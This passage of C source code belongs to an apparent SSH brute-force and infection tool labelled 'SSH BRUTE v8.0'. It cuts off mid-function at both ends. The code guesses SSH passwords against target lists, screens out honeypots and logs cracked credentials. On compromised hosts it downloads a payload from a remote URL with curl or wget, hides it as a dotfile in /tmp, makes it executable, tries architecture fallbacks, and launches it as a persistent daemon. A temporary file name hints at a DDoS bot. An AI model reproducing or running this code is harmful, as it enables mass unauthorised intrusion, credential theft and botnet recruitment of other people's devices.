    /* Gather extra system info before starting */
    log_infect(r->ip, r->port, "[PHASE 0] Gathering extra system info...");
    char sysinfo_buf[2048] = {0};
    ssh_exec_logged(ses, "id; uname -a; cat /proc/version 2>/dev/null; cat /proc/cpuinfo 2>/dev/null | head -20; free 2>/dev/null || cat /proc/meminfo 2>/dev/null | head -5; df -h 2>/dev/null | head -10; mount 2>/dev/null | head -10",
                    sysinfo_buf, sizeof(sysinfo_buf), r->ip, r->port, "SYSINFO");

    /* Find writable directory */
    log_infect(r->ip, r->port, "----------------------------------------------------------------");
    log_infect(r->ip, r->port, "[PHASE 1] Searching for writable directory...");
    const char *dirs[] = {"/tmp", "/var/tmp", "/dev/shm", "/var/run", "/run", "/dev", NULL};
    const char *work_dir = NULL;
    for (int d = 0; dirs[d]; d++) {
        char chk[256];
        char chk_buf[256] = {0};
        snprintf(chk, sizeof(chk), "[ -d %s ] && [ -w %s ] && echo WROK || echo WRNO; ls -la %s/ 2>&1 | head -5",
                 dirs[d], dirs[d], dirs[d]);
        int cr = ssh_exec_logged(ses, chk, chk_buf, sizeof(chk_buf), r->ip, r->port, "DIRCHK");
        if (cr > 0 && strstr(chk_buf, "WROK")) {
            work_dir = dirs[d];
            log_infect(r->ip, r->port, "  >>> SELECTED writable dir: %s", work_dir);
            break;
        }
    }
    if (!work_dir) {
        log_infect(r->ip, r->port, "ABORT: no writable directory found on target");
        log_infect(r->ip, r->port, "=== INFECT ABORTED (no writable dir) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
        return;
    }

    /* Extract filename from URL */
    const char *fname = strrchr(bin_url, '/');
    if (fname) fname++; else fname = "payload";
    char full_path[512];
    snprintf(full_path, sizeof(full_path), "%s/.%s", work_dir, fname);
    log_infect(r->ip, r->port, "Target file path: %s (hidden with dot prefix)", full_path);

    /* Remove old file if exists */
    log_infect(r->ip, r->port, "----------------------------------------------------------------");
    log_infect(r->ip, r->port, "[PHASE 2] Cleaning up old file if exists...");
    char rm_cmd[512];
    snprintf(rm_cmd, sizeof(rm_cmd), "rm -f '%s' 2>&1; ls -la '%s' 2>&1; echo CLEANUP_DONE", full_path, full_path);
    char rm_buf[256] = {0};
    ssh_exec_logged(ses, rm_cmd, rm_buf, sizeof(rm_buf), r->ip, r->port, "CLEANUP");

    /* Download binary */
    log_infect(r->ip, r->port, "----------------------------------------------------------------");
    log_infect(r->ip, r->port, "[PHASE 3] Downloading binary...");
    log_infect(r->ip, r->port, "  URL: %s", bin_url);
    log_infect(r->ip, r->port, "  Destination: %s", full_path);
    log_infect(r->ip, r->port, "  Method: %s", r->has_wget ? "wget" : "curl");
    char dl_cmd[1024];
    char dl_buf[8192] = {0};
    int dl_ok = 0;

    /* Try download up to 3 times */
    for (int dl_try = 0; dl_try < 3 && !dl_ok; dl_try++) {
        if (dl_try > 0) {
            log_infect(r->ip, r->port, "  Retry download attempt %d/3...", dl_try + 1);
            /* Clean up partial file before retry */
            char retry_rm[512];
            snprintf(retry_rm, sizeof(retry_rm), "rm -f '%s' 2>/dev/null", full_path);
            char retry_rm_buf[64] = {0};
            ssh_exec_cmd(ses, retry_rm, retry_rm_buf, sizeof(retry_rm_buf));
        }

        memset(dl_buf, 0, sizeof(dl_buf));
        if (r->has_curl) {
            /* Use curl without -v to reduce output size and avoid read truncation */
            snprintf(dl_cmd, sizeof(dl_cmd),
                     "curl -sS -o '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, bin_url);
        } else {
            snprintf(dl_cmd, sizeof(dl_cmd),
                     "wget -O '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, bin_url);
        }

        int dr = ssh_exec_logged(ses, dl_cmd, dl_buf, sizeof(dl_buf), r->ip, r->port, "DOWNLOAD");

        if (strstr(dl_buf, "DL_EXIT=0")) {
            dl_ok = 1;
        } else {
            log_infect(r->ip, r->port, "  Download attempt %d failed (DL_EXIT=0 not found, got %d bytes output)", dl_try + 1, dr);
        }
    }

    if (!dl_ok) {
        log_infect(r->ip, r->port, "ABORT: download failed after 3 attempts (DL_EXIT=0 never found)");
        log_infect(r->ip, r->port, "=== INFECT ABORTED (download failed) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
        return;
    }
    log_infect(r->ip, r->port, ">>> Download completed successfully (DL_EXIT=0 found)");

    /* Verify downloaded file */
    log_infect(r->ip, r->port, "----------------------------------------------------------------");
    log_infect(r->ip, r->port, "[PHASE 4] Verifying downloaded file...");
    char verify_cmd[512];
    snprintf(verify_cmd, sizeof(verify_cmd),
             "ls -la '%s' 2>&1; file '%s' 2>&1; wc -c < '%s' 2>/dev/null; md5sum '%s' 2>/dev/null || md5 '%s' 2>/dev/null; head -c 4 '%s' 2>/dev/null | od -A x -t x1z 2>/dev/null",
             full_path, full_path, full_path, full_path, full_path, full_path);
    char verify_buf[2048] = {0};
    ssh_exec_logged(ses, verify_cmd, verify_buf, sizeof(verify_buf), r->ip, r->port, "VERIFY");

    /* Check file is not empty */
    char sz_cmd[512];
    snprintf(sz_cmd, sizeof(sz_cmd), "wc -c < '%s' 2>/dev/null || echo 0", full_path);
    char sz_buf[256] = {0};
    ssh_exec_logged(ses, sz_cmd, sz_buf, sizeof(sz_buf), r->ip, r->port, "FILESIZE");
    int file_sz = atoi(sz_buf);
    log_infect(r->ip, r->port, "File size: %d bytes", file_sz);
    if (file_sz <= 0) {
        log_infect(r->ip, r->port, "ABORT: downloaded file is empty or missing (size=%d)", file_sz);
        log_infect(r->ip, r->port, "=== INFECT ABORTED (empty file) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
        return;
    }

    /* chmod +x */
    log_infect(r->ip, r->port, "----------------------------------------------------------------");
    log_infect(r->ip, r->port, "[PHASE 5] Setting executable permission...");
    char chmod_cmd[512];
    snprintf(chmod_cmd, sizeof(chmod_cmd),
             "chmod +x '%s' 2>&1; echo CH_EXIT=$?; ls -la '%s' 2>&1", full_path, full_path);
    char chmod_buf[512] = {0};
    ssh_exec_logged(ses, chmod_cmd, chmod_buf, sizeof(chmod_buf), r->ip, r->port, "CHMOD");

    if (!strstr(chmod_buf, "CH_EXIT=0")) {
        log_infect(r->ip, r->port, "ABORT: chmod +x failed");
        log_infect(r->ip, r->port, "=== INFECT ABORTED (chmod failed) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
        return;
    }
    log_infect(r->ip, r->port, ">>> chmod +x SUCCESS");

    /* Verify it is executable */
    char test_cmd[512];
    snprintf(test_cmd, sizeof(test_cmd),
             "[ -x '%s' ] && echo EXEC_YES || echo EXEC_NO; stat '%s' 2>/dev/null", full_path, full_path);
    char test_buf[512] = {0};
    ssh_exec_logged(ses, test_cmd, test_buf, sizeof(test_buf), r->ip, r->port, "EXECCHK");

    /* Test-run the binary to see if it can execute at all */
    log_infect(r->ip, r->port, "----------------------------------------------------------------");
    log_infect(r->ip, r->port, "[PHASE 6] Testing binary execution...");
    log_infect(r->ip, r->port, "  Binary: %s", full_path);

    /* Extract filename for process search (used here and in PHASE 7) */
    const char *test_fname = strrchr(full_path, '/');
    if (test_fname) test_fname++; else test_fname = full_path;
    const char *test_fname_nodot = (test_fname[0] == '.') ? test_fname + 1 : test_fname;

    /* Quick test: run the binary, wait 2s, check for errors.
       With self-daemonizing binaries, TBIN_DEAD is EXPECTED (parent does _exit(0)).
       We check for fatal errors AND search by process name. */
    char test_exec[1024];
    snprintf(test_exec, sizeof(test_exec),
             "'%s' </dev/null >/dev/null 2>/tmp/.mhddos_test_err &"
             " TPID=$!; sleep 2;"
             " kill -0 $TPID 2>/dev/null && echo TBIN_ALIVE || echo TBIN_DEAD;"
             " cat /tmp/.mhddos_test_err 2>/dev/null;"
             " ps w 2>/dev/null | grep -v grep | grep -v 'sh -c' | grep '%s' | head -3;"
             " kill $TPID 2>/dev/null; wait $TPID 2>/dev/null;"
             " rm -f /tmp/.mhddos_test_err;"
             " echo TEST_DONE", full_path, test_fname_nodot);
    char test_out[2048] = {0};
    ssh_exec_logged(ses, test_exec, test_out, sizeof(test_out), r->ip, r->port, "TEST_RUN");

    /* Check for fatal execution errors */
    int test_failed = 0;
    if (strstr(test_out, "syntax error") ||
        strstr(test_out, "Exec format error") ||
        strstr(test_out, "not found") ||
        strstr(test_out, "No such file") ||
        strstr(test_out, "Permission denied") ||
        strstr(test_out, "cannot execute") ||
        strstr(test_out, "SIGILL") ||
        strstr(test_out, "Illegal instruction")) {
        log_infect(r->ip, r->port, "!!! Binary CANNOT execute (fatal error in test output)");
        test_failed = 1;
    } else if (strstr(test_out, "TBIN_DEAD")) {
        /* TBIN_DEAD can be OK if binary self-daemonizes (parent exits via _exit).
           Check if the daemon process is running by name. */
        if (strstr(test_out, test_fname_nodot)) {
            log_infect(r->ip, r->port, "  Parent exited (self-daemon), but process found by name — OK");
            /* Kill the daemon we just started for testing */
            char kill_cmd[256];
            snprintf(kill_cmd, sizeof(kill_cmd),
                     "pkill -f '%s' 2>/dev/null; killall '%s' 2>/dev/null; echo KILLED",
                     test_fname_nodot, test_fname);
            char kill_buf[128] = {0};
            ssh_exec_logged(ses, kill_cmd, kill_buf, sizeof(kill_buf), r->ip, r->port, "TEST_CLEANUP");
        } else {
            log_infect(r->ip, r->port, "!!! Binary exited/crashed within 2s and no daemon found");
            test_failed = 2;
        }
    }

    /* If test failed, try alternative binary suffixes */
    if (test_failed) {
        /* Build list of fallback suffixes to try */
        const char *fallbacks[16];
        int nfallbacks = 0;

        if (strcmp(r->arch, "mips") == 0 && strcmp(r->endian, "LE") == 0) {
            fallbacks[nfallbacks++] = "mipsel_old";
            fallbacks[nfallbacks++] = "mips";
            fallbacks[nfallbacks++] = "mips_old";
            fallbacks[nfallbacks++] = "mips_oldest";
        } else if (strcmp(r->arch, "mips") == 0 && strcmp(r->endian, "BE") == 0) {
            fallbacks[nfallbacks++] = "mips_old";
            fallbacks[nfallbacks++] = "mips_oldest";
            fallbacks[nfallbacks++] = "mipsel";
            fallbacks[nfallbacks++] = "mipsel_old";
        } else if (strcmp(r->bin_suffix, "mipsel") == 0) {
            fallbacks[nfallbacks++] = "mipsel_old";
        } else if (strcmp(r->bin_suffix, "mips") == 0) {
            fallbacks[nfallbacks++] = "mips_old";
            fallbacks[nfallbacks++] = "mips_oldest";
        } else if (strcmp(r->bin_suffix, "armhf") == 0) {
            fallbacks[nfallbacks++] = "arm";
        } else if (strcmp(r->bin_suffix, "arm") == 0) {
            fallbacks[nfallbacks++] = "armhf";
        }

        log_infect(r->ip, r->port, "  Primary binary failed, trying %d fallback(s)...", nfallbacks);

        int fallback_ok = 0;
        for (int fi = 0; fi < nfallbacks && !fallback_ok; fi++) {
            const char *alt_suffix = fallbacks[fi];

            if (strcmp(alt_suffix, r->bin_suffix) == 0)
                continue;

            const char *alt_url = NULL;
            for (int i = 0; i < g_nbins; i++) {
                if (strcmp(g_bins[i].arch, alt_suffix) == 0) {
                    alt_url = g_bins[i].url;
                    break;
                }
            }
            if (!alt_url) {
                log_infect(r->ip, r->port, "  Fallback [%d] '%s' — not in binaries.txt, skip", fi, alt_suffix);
                continue;
            }

            log_infect(r->ip, r->port, "  Fallback [%d] trying suffix '%s' — URL: %s", fi, alt_suffix, alt_url);

            const char *alt_fname = strrchr(alt_url, '/');
            if (alt_fname) alt_fname++; else alt_fname = "payload_alt";
            snprintf(full_path, sizeof(full_path), "%s/.%s", work_dir, alt_fname);

            /* Download alt binary */
            if (r->has_wget) {
                snprintf(dl_cmd, sizeof(dl_cmd), "wget -O '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, alt_url);
            } else {
                snprintf(dl_cmd, sizeof(dl_cmd), "curl -o '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, alt_url);
            }
            memset(dl_buf, 0, sizeof(dl_buf));
            char alt_label[32];
            snprintf(alt_label, sizeof(alt_label), "DL_ALT%d", fi);
            ssh_exec_logged(ses, dl_cmd, dl_buf, sizeof(dl_buf), r->ip, r->port, alt_label);
            if (!strstr(dl_buf, "DL_EXIT=0")) {
                log_infect(r->ip, r->port, "  Fallback [%d] download failed, skip", fi);
                continue;
            }

            /* chmod +x alt binary */
            snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x '%s' 2>&1; echo CH_EXIT=$?", full_path);
            memset(chmod_buf, 0, sizeof(chmod_buf));
            snprintf(alt_label, sizeof(alt_label), "CHMOD_ALT%d", fi);
            ssh_exec_logged(ses, chmod_cmd, chmod_buf, sizeof(chmod_buf), r->ip, r->port, alt_label);

            /* Test alt binary — same logic: check errors + search by name */
            const char *alt_fn = strrchr(full_path, '/');
            if (alt_fn) alt_fn++; else alt_fn = full_path;
            const char *alt_fn_nodot = (alt_fn[0] == '.') ? alt_fn + 1 : alt_fn;

            snprintf(test_exec, sizeof(test_exec),
                     "'%s' </dev/null >/dev/null 2>/tmp/.mhddos_test_err &"
                     " TPID=$!; sleep 2;"
                     " kill -0 $TPID 2>/dev/null && echo TBIN_ALIVE || echo TBIN_DEAD;"
                     " cat /tmp/.mhddos_test_err 2>/dev/null;"
                     " ps w 2>/dev/null | grep -v grep | grep -v 'sh -c' | grep '%s' | head -3;"
                     " kill $TPID 2>/dev/null; wait $TPID 2>/dev/null;"
                     " rm -f /tmp/.mhddos_test_err;"
                     " echo TEST_DONE", full_path, alt_fn_nodot);
            memset(test_out, 0, sizeof(test_out));
            snprintf(alt_label, sizeof(alt_label), "TEST_ALT%d", fi);
            ssh_exec_logged(ses, test_exec, test_out, sizeof(test_out), r->ip, r->port, alt_label);

            int alt_ok = 0;
            if (strstr(test_out, "TBIN_ALIVE")) {
                alt_ok = 1;
            } else if (strstr(test_out, "TBIN_DEAD") && strstr(test_out, alt_fn_nodot)) {
                alt_ok = 1; /* self-daemon: parent exited but daemon found by name */
            }
            /* Check no fatal errors */
            if (alt_ok && !strstr(test_out, "syntax error") && !strstr(test_out, "Exec format error") &&
                !strstr(test_out, "cannot execute") && !strstr(test_out, "SIGILL")) {
                log_infect(r->ip, r->port, "  Fallback [%d] '%s' WORKS!", fi, alt_suffix);
                strncpy(r->bin_suffix, alt_suffix, sizeof(r->bin_suffix) - 1);
                /* Kill test daemon */
                char kill_cmd[256];
                snprintf(kill_cmd, sizeof(kill_cmd),
                         "pkill -f '%s' 2>/dev/null; killall '%s' 2>/dev/null",
                         alt_fn_nodot, alt_fn);
                char kill_buf[128] = {0};
                ssh_exec_logged(ses, kill_cmd, kill_buf, sizeof(kill_buf), r->ip, r->port, "TEST_CLEANUP");
                fallback_ok = 1;
                test_failed = 0;
            } else {
                log_infect(r->ip, r->port, "  Fallback [%d] '%s' also failed", fi, alt_suffix);
            }
        }

        if (!fallback_ok) {
            log_infect(r->ip, r->port, "=== INFECT FAILED (all %d fallback binaries failed) ===", nfallbacks > 0 ? nfallbacks : 1);
            log_infect(r->ip, r->port, "================================================================");
            atomic_fetch_add(&G_infect_fail, 1);
            return;
        }
    }
    log_infect(r->ip, r->port, "  Binary test passed");

    /* ── PHASE 7: Launch and verify ──
       Binary self-daemonizes (double-fork + setsid + signal handling internally).
       The parent process exits immediately after fork, so $! PID will be dead.
       We verify by searching for the process by NAME, not PID. */
    log_infect(r->ip, r->port, "----------------------------------------------------------------");
    log_infect(r->ip, r->port, "[PHASE 7] Launching and verifying binary...");
    log_infect(r->ip, r->port, "  Binary: %s", full_path);

    /* Extract base filename for process-name search */
    const char *base_name = strrchr(full_path, '/');
    if (base_name) base_name++; else base_name = full_path;
    /* Get name without leading dot for search */
    const char *base_nodot = (base_name[0] == '.') ? base_name + 1 : base_name;

    char exec_cmd[2048];
    char exec_buf[2048] = {0};
    int success = 0;

    /* Binary self-daemonizes: just execute it, wait, and search by name.
       The binary does: fork() -> parent exits -> setsid() -> fork() -> daemon runs.
       So we just run it, the parent returns immediately, then we check. */
    log_infect(r->ip, r->port, "  Executing (binary self-daemonizes)...");
    snprintf(exec_cmd, sizeof(exec_cmd),
             "'%s' 2>/dev/null; "
             "sleep 3; "
             "echo '--- PROCESS SEARCH ---'; "
             "ps w 2>/dev/null | grep -v grep | grep -v 'sh -c' | grep '%s' | head -5; "
             "pgrep -la '%s' 2>/dev/null | head -5; "
             "echo SEARCH_DONE",
             full_path, base_nodot, base_nodot);
    ssh_exec_logged(ses, exec_cmd, exec_buf, sizeof(exec_buf), r->ip, r->port, "LAUNCH");

    /* Check if daemon is running by name */
    char *search_section = strstr(exec_buf, "PROCESS SEARCH");
    const char *search_in = search_section ? search_section : exec_buf;
    if (strstr(search_in, base_nodot)) {
        success = 1;
        log_infect(r->ip, r->port, ">>> Daemon found running by name '%s'!", base_nodot);
    }

    /* Fallback: if self-daemon didn't work, try with trap + nohup */
    if (!success) {
        log_infect(r->ip, r->port, "  Self-daemon not found, fallback: trap + nohup");
        memset(exec_buf, 0, sizeof(exec_buf));
        snprintf(exec_cmd, sizeof(exec_cmd),
                 "trap '' HUP PIPE TERM; "
                 "nohup '%s' </dev/null >/dev/null 2>&1 & "
                 "LPID=$!; echo LPID=$LPID; "
                 "sleep 3; "
                 "kill -0 $LPID 2>/dev/null && echo PID_ALIVE || echo PID_DEAD; "
                 "ps w 2>/dev/null | grep -v grep | grep -v 'sh -c' | grep '%s' | head -3; "
                 "echo CHECK_DONE",
                 full_path, base_nodot);
        ssh_exec_logged(ses, exec_cmd, exec_buf, sizeof(exec_buf), r->ip, r->port, "LAUNCH_FB");

        if (strstr(exec_buf, "PID_ALIVE")) {
            success = 1;
            log_infect(r->ip, r->port, ">>> Fallback SUCCESS: PID alive!");
        } else if (strstr(exec_buf, base_nodot)) {
            success = 1;
            log_infect(r->ip, r->port, ">>> Fallback: process found by name!");
        }
    }

    if (success) {
        log_infect(r->ip, r->port, "=== INFECT SUCCESS (daemon verified running) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infected, 1);
    } else {
        log_infect(r->ip, r->port, "Process not found after launch");
        log_infect(r->ip, r->port, "=== INFECT FAILED (daemon not running) ===");
        log_infect(r->ip, r->port, "================================================================");
        atomic_fetch_add(&G_infect_fail, 1);
    }
}

static void save_result(Result *r) {
    pthread_mutex_lock(&g_resmtx);
    if (g_nresults >= g_rescap) {
        g_rescap = g_rescap ? g_rescap * 2 : 256;
        g_results = realloc(g_results, g_rescap * sizeof(Result));
    }
    g_results[g_nresults++] = *r;
    pthread_mutex_unlock(&g_resmtx);

    pthread_mutex_lock(&g_filemtx);
    const char *fn = (r->hp == 1) ? "honeypots.txt" : "valid_linux.txt";
    FILE *fp = fopen(fn, "a");
    if (fp) {
        fprintf(fp, "%s:%d %s:%s", r->ip, r->port, r->user, r->pass);
        if (r->hp == 0 && r->bin_suffix[0])
            fprintf(fp, " - %s", r->bin_suffix);
        if (r->info[0])
            fprintf(fp, " | %s", r->info);
        fprintf(fp, "\n");
        fclose(fp);
    }
    pthread_mutex_unlock(&g_filemtx);
}

static rawssh_session *open_session(const char *ip, int port) {
    rawssh_session *ses = rawssh_session_new();
    if (!ses)
        return NULL;
    rawssh_set_timeout(ses, g_timeout);
    if (g_nic[0])
        rawssh_bind_nic(ses, g_nic);

    int rc = rawssh_connect(ses, ip, port);
    if (rc != RAWSSH_OK) {
        atomic_fetch_add(&G_tcp_err, 1);
        rawssh_session_free(ses);
        return NULL;
    }
    atomic_fetch_add(&G_tcp_ok, 1);

    rc = rawssh_handshake(ses);
    if (rc != RAWSSH_OK) {
        atomic_fetch_add(&G_ssh_err, 1);
        switch (rc) {
            case RAWSSH_TIMEOUT:
                atomic_fetch_add(&G_ssh_timeout, 1);
                break;
            case RAWSSH_TCP_ERROR:
                atomic_fetch_add(&G_ssh_tcperr, 1);
                break;
            case RAWSSH_CLOSED:
                atomic_fetch_add(&G_ssh_closed, 1);
                break;
            case RAWSSH_HANDSHAKE_FAIL:
                atomic_fetch_add(&G_ssh_hsfail, 1);
                break;
            case RAWSSH_PROTO_ERROR:
                atomic_fetch_add(&G_ssh_proto, 1);
                break;
            default:
                atomic_fetch_add(&G_ssh_other, 1);
                break;
        }
        int err_total = atomic_load(&G_ssh_err);
        if (err_total <= 500) {
            pthread_mutex_lock(&g_logmtx);
            FILE *lf = fopen("ssh_errors.log", "a");
            if (lf) {
                fprintf(lf, "%s:%d handshake_fail rc=%d (%s) step=%s\n",
                        ip, port, rc, rawssh_error_str(rc),
                        rawssh_handshake_step_str(ses));
                fclose(lf);
            }
            pthread_mutex_unlock(&g_logmtx);
        }
        rawssh_disconnect(ses);
        rawssh_session_free(ses);
        return NULL;
    }
    atomic_fetch_add(&G_ssh_ok, 1);
    return ses;
}

static void close_session(rawssh_session *ses) {
    if (!ses)
        return;
    rawssh_disconnect(ses);
    rawssh_session_free(ses);
}

static void process(int idx) {
    Target *t = &g_targets[idx];
    atomic_fetch_add(&G_active, 1);

    sem_wait(&g_sem);

    rawssh_session *ses = open_session(t->ip, t->port);
    if (!ses) {
        sem_post(&g_sem);
        goto done;
    }

    int combo = 0;
    int total = NCREDS;
    int errs = 0;
    int auth_count = 0;

    while (combo < total) {
        if (auth_count >= AUTH_PER_CONN) {
            close_session(ses);
            ses = open_session(t->ip, t->port);
            if (!ses) {
                ses = open_session(t->ip, t->port);
                if (!ses) {
                    sem_post(&g_sem);
                    goto done;
                }
            }
            auth_count = 0;
        }

        atomic_fetch_add(&G_tested, 1);

        int rc = rawssh_auth_password(ses, CREDS[combo].u, CREDS[combo].p);

        if (rc == RAWSSH_OK) {
            atomic_fetch_add(&G_found, 1);
            int hp = check_hp(ses);
            Result r = {.port = t->port, .hp = hp, .uid = -1, .has_wget = 0,
                        .has_curl = 0, .has_printf = 0, .has_chmod = 0, .tmp_writable = 0};
            strncpy(r.ip, t->ip, 47);
            strncpy(r.user, CREDS[combo].u, 31);
            strncpy(r.pass, CREDS[combo].p, 31);
            memset(r.arch, 0, sizeof(r.arch));
            memset(r.endian, 0, sizeof(r.endian));
            memset(r.mips_ver, 0, sizeof(r.mips_ver));
            memset(r.kernel, 0, sizeof(r.kernel));
            memset(r.libc, 0, sizeof(r.libc));
            memset(r.mips_class, 0, sizeof(r.mips_class));
            memset(r.bin_suffix, 0, sizeof(r.bin_suffix));
            memset(r.info, 0, sizeof(r.info));

            if (hp == 0)
                get_info(ses, &r);
            if (hp == 1)
                atomic_fetch_add(&G_hp, 1);
            else
                atomic_fetch_add(&G_real, 1);

            save_result(&r);

            if (hp == 0 && g_infect)
                try_infect(ses, &r);

            close_session(ses);
            sem_post(&g_sem);
            goto done;
        }

        if (rc == RAWSSH_AUTH_FAIL) {
            atomic_fetch_add(&G_wrong, 1);
            combo++;
            auth_count++;
            errs = 0;
            continue;
        }

        close_session(ses);
        ses = NULL;

        if (rc == RAWSSH_CLOSED) {
            if (auth_count == 0) {
                atomic_fetch_add(&G_sess_err, 1);
                if (++errs >= 3) {
                    sem_post(&g_sem);
                    goto done;
                }
            } else {
                errs = 0;
            }

            ses = open_session(t->ip, t->port);
            if (!ses) {
                sem_post(&g_sem);
                goto done;
            }
            auth_count = 0;
            continue;
        }

        atomic_fetch_add(&G_sess_err, 1);
        if (++errs >= 3) {
            sem_post(&g_sem);
            goto done;
        }

        ses = open_session(t->ip, t->port);
        if (!ses) {
            sem_post(&g_sem);
            goto done;
        }
        auth_count = 0;
    }

    close_session(ses);
    sem_post(&g_sem);

done:
    atomic_fetch_sub(&G_active, 1);
    atomic_fetch_add(&G_done, 1);
}

static void draw() {
    int el = (int)(time(NULL) - g_start);
    if (el < 1)
        el = 1;
    int done = atomic_load(&G_done);
    int act = atomic_load(&G_active);
    int tested = atomic_load(&G_tested);
    int found = atomic_load(&G_found);
    int real = atomic_load(&G_real);
    int hp = atomic_load(&G_hp);
    int tcp_ok = atomic_load(&G_tcp_ok);
    int tcp_err = atomic_load(&G_tcp_err);
    int ssh_ok = atomic_load(&G_ssh_ok);
    int ssh_err = atomic_load(&G_ssh_err);
    int wrong = atomic_load(&G_wrong);
    int sess_err = atomic_load(&G_sess_err);
    float pct = g_ntargets ? (done * 100.0f / g_ntargets) : 0;
    int spd = tested * 60 / el;
    int ips = done / el;

    printf(CLEAR_SCREEN);
    printf("\n  %s%sSSH BRUTE v8.0 [RawSSH]%s  %d threads | %ds timeout | max %d conn",
           C_BOLD, C_CYAN, C_RESET, g_threads, g_timeout, g_maxconn);
    if (g_nic[0])
        printf(" | NIC: %s%s%s", C_GREEN, g_nic, C_RESET);
    if (g_infect)
        printf(" | %sINFECT: ON%s (%d bins)", C_RED, C_RESET, g_nbins);
    printf("\n\n");
    printf("  %sProgress:%s %d/%d (%s%.1f%%%s)  %sActive:%s %d  %sSpeed:%s %d/min  %sIPs/s:%s %d\n",
           C_YELLOW, C_RESET, done, g_ntargets, C_GREEN, pct, C_RESET,
           C_YELLOW, C_RESET, act, C_YELLOW, C_RESET, spd, C_YELLOW, C_RESET, ips);
    int infected = atomic_load(&G_infected);
    int infect_fail = atomic_load(&G_infect_fail);
    printf("  %sTime:%s %02d:%02d  %sFound:%s %s%d%s  %sReal:%s %s%d%s  %sHP:%s %s%d%s",
           C_YELLOW, C_RESET, el / 60, el % 60,
           C_BOLD, C_RESET, C_GREEN, found, C_RESET,
           C_BOLD, C_RESET, C_GREEN, real, C_RESET,
           C_BOLD, C_RESET, C_ORANGE, hp, C_RESET);
    if (g_infect)
        printf("  %sInfected:%s %s%d%s  %sFail:%s %s%d%s",
               C_BOLD, C_RESET, C_RED, infected, C_RESET,
               C_BOLD, C_RESET, C_GRAY, infect_fail, C_RESET);
    printf("\n\n");

    int tcp_tot = tcp_ok + tcp_err;
    int ssh_tot = ssh_ok + ssh_err;
    printf("  %sTCP:%s %d/%d (%.0f%% ok)  %sSSH:%s %d/%d (%.0f%% ok)  %sWrong:%s %d  %sSessErr:%s %d\n",
           C_GRAY, C_RESET, tcp_ok, tcp_tot, tcp_tot ? (tcp_ok * 100.0f / tcp_tot) : 0,
           C_GRAY, C_RESET, ssh_ok, ssh_tot, ssh_tot ? (ssh_ok * 100.0f / ssh_tot) : 0,
           C_GRAY, C_RESET, wrong,
           C_RED, C_RESET, sess_err);
    if (ssh_err > 0) {
        printf("  %sSSH Errors:%s TMO=%d TCP=%d CLS=%d HS=%d PROTO=%d OTHER=%d\n",
               C_RED, C_RESET,
               atomic_load(&G_ssh_timeout),
               atomic_load(&G_ssh_tcperr),
               atomic_load(&G_ssh_closed),
               atomic_load(&G_ssh_hsfail),
               atomic_load(&G_ssh_proto),
               atomic_load(&G_ssh_other));
    }
    printf("\n");

    pthread_mutex_lock(&g_resmtx);
    int st = (g_nresults > 8) ? g_nresults - 8 : 0;
    for (int i = st; i < g_nresults; i++) {
        Result *r = &g_results[i];
        const char *tag = r->hp == 1 ? "[HP]" : "[OK]";
        const char *col = r->hp == 1 ? C_ORANGE : C_GREEN;
        if (r->hp == 0 && r->bin_suffix[0])
            printf("  %s%s%s %s:%d %s%s%s:%s%s%s - %s%s%s\n",
                   col, tag, C_RESET, r->ip, r->port,
                   C_WHITE, r->user, C_RESET, C_YELLOW, r->pass, C_RESET,
                   C_BOLD, r->bin_suffix, C_RESET);
        else
            printf("  %s%s%s %s:%d %s%s%s:%s%s%s\n",
                   col, tag, C_RESET, r->ip, r->port,
                   C_WHITE, r->user, C_RESET, C_YELLOW, r->pass, C_RESET);
        if (r->hp == 0 && r->arch[0]) {
            #define YN_COL(v) ((v) ? C_GREEN : C_RED)
            #define YN_STR(v) ((v) ? "YES" : "NO")
            printf("       %s%s%s %s%s%s",
                   C_CYAN, r->arch, C_RESET,
                   C_GRAY, r->endian, C_RESET);
            if (r->mips_ver[0] && strcmp(r->mips_ver, "-") != 0)
                printf(" %s%s%s", C_WHITE, r->mips_ver, C_RESET);
            if (r->mips_class[0])
                printf(" [%s%s%s]", C_YELLOW, r->mips_class, C_RESET);
            if (r->kernel[0])
                printf(" k:%s%s%s", C_GRAY, r->kernel, C_RESET);
            if (r->libc[0])
                printf(" %s%s%s", C_GRAY, r->libc, C_RESET);
            printf(" R:%s%s%s",
                   r->uid == 0 ? C_GREEN : C_RED,
                   r->uid == 0 ? "YES" : "NO",
                   C_RESET);
            printf(" W:%s%s%s", YN_COL(r->has_wget), YN_STR(r->has_wget), C_RESET);
            printf(" C:%s%s%s", YN_COL(r->has_curl), YN_STR(r->has_curl), C_RESET);
            printf(" T:%s%s%s", YN_COL(r->tmp_writable), YN_STR(r->tmp_writable), C_RESET);
            printf(" CH:%s%s%s", YN_COL(r->has_chmod), YN_STR(r->has_chmod), C_RESET);
            printf(" PF:%s%s%s", YN_COL(r->has_printf), YN_STR(r->has_printf), C_RESET);
            printf("\n");
            #undef YN_COL
            #undef YN_STR
        } else if (r->hp == 0 && r->info[0]) {
            printf("       %s%s%s\n", C_GRAY, r->info, C_RESET);
        }
    }
    pthread_mutex_unlock(&g_resmtx);
    printf("\n");
    fflush(stdout);
}

static void *panel_fn(void *_) {
    (void)_;
    while (atomic_load(&g_run)) {
        draw();
        usleep(500000);
    }
    draw();
    return NULL;
}

static void *worker_fn(void *_) {
    (void)_;
    int i;
    while ((i = atomic_fetch_add(&G_next, 1)) < g_ntargets)
        process(i);
    return NULL;
}

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-t"))
            g_threads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-T"))
            g_timeout = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-c"))
            g_maxconn = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-i"))
            strncpy(g_nic, argv[++i], sizeof(g_nic) - 1);
        else if (!strcmp(argv[i], "-I"))
